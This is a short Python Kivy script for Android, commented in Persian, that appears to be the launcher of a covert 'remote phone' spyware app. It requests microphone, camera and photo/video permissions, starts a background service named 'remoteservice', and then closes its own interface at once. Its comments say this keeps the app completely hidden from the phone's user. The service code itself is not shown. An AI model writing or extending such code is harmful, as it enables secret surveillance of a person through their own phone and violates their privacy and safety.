from kivy.app import App
from kivy.utils import platform

class PhoneRemoteApp(App):
    def build(self):
        # ۱. درخواست دسترسی‌های سخت‌افزاری اندروید
        self.request_android_permissions()
        
        # ۲. روشن کردن موتور پس‌زمینه بدون باز کردن هیچ صفحه‌ای
        if platform == "android":
            from android import start_service
            start_service('remoteservice', 'Remote Phone', 'Service is active...')
        
        # ۳. خروج فوری از ظاهر گرافیکی تا صفحه گوشی کاملاً مخفی بماند
        self.stop()

    def request_android_permissions(self):
        if platform == "android":
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.RECORD_AUDIO,
                Permission.CAMERA,
                Permission.READ_MEDIA_IMAGES,
                Permission.READ_MEDIA_VIDEO
            ])

if __name__ == "__main__":
    PhoneRemoteApp().run()